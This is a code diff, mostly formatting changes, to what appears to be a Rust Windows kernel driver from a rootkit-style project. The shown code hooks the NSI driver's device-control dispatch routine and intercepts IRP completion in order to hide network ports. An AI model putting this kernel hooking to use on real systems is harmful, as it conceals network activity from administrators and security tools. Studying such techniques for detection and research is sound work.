@@ -3,35 +3,27 @@ use core::{
     mem::size_of,
     ptr::{copy, null_mut},
     slice::from_raw_parts_mut,
-    sync::atomic::{
-        AtomicBool, 
-        AtomicPtr, 
-        Ordering
-    },
+    sync::atomic::{AtomicBool, AtomicPtr, Ordering},
 };
 
 use alloc::vec::Vec;
-use spin::{lazy::Lazy, Mutex};
+use spin::{Mutex, lazy::Lazy};
 use wdk::println;
 use wdk_sys::{
-    *, _MODE::KernelMode,
-    ntddk::{
-        ExFreePool, 
-        ObfDereferenceObject, 
-    },
+    _MODE::KernelMode,
+    ntddk::{ExFreePool, ObfDereferenceObject},
+    *,
 };
 
+use crate::{
+    Result,
+    data::*,
+    error::ShadowError,
+    utils::{pool::PoolMemory, uni::str_to_unicode, *},
+};
 use common::{
     enums::{PortType, Protocol},
     structs::TargetPort,
-};
-use crate::{
-    data::*, Result,
-    error::ShadowError,
-    utils::{
-        *, pool::PoolMemory, 
-        uni::str_to_unicode,
-    },
 };
 
 // The maximum number of ports that can be hidden
@@ -81,7 +73,10 @@ impl Network {
 
         // Check if the driver object was referenced successfully.
         if !NT_SUCCESS(status) {
-            return Err(ShadowError::ApiCallFailed("ObReferenceObjectByName", status));
+            return Err(ShadowError::ApiCallFailed(
+                "ObReferenceObjectByName",
+                status,
+            ));
         }
 
         // Try to replace the original IRP_MJ_DEVICE_CONTROL dispatch function.
@@ -125,7 +120,10 @@ impl Network {
 
         // Handle error if the driver object can't be referenced.
         if !NT_SUCCESS(status) {
-            return Err(ShadowError::ApiCallFailed("ObReferenceObjectByName", status));
+            return Err(ShadowError::ApiCallFailed(
+                "ObReferenceObjectByName",
+                status,
+            ));
         }
 
         // If the hook is installed, restore the original dispatch function.
@@ -167,8 +165,7 @@ impl Network {
     /// # Returns
     ///
     /// * The result of the original dispatch function, or `STATUS_UNSUCCESSFUL` if the hook fails.
-    unsafe extern "C" 
-    fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
+    unsafe extern "C" fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
         let stack = (*irp)
             .Tail
             .Overlay
@@ -184,7 +181,7 @@ impl Network {
                 size_of::<(PIO_COMPLETION_ROUTINE, *mut c_void)>() as u64,
                 "giud",
             );
-            
+
             if let Some(addr) = context {
                 let address = addr.ptr as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);
                 (*address).0 = (*stack).CompletionRoutine;
@@ -221,8 +218,7 @@ impl Network {
     /// # Returns
     ///
     /// * Returns the result of the original completion routine, or `STATUS_SUCCESS` if processing was successful.
-    unsafe extern "C" 
-    fn irp_complete(
+    unsafe extern "C" fn irp_complete(
         device_object: *mut DEVICE_OBJECT,
         irp: *mut IRP,
         context: *mut c_void,
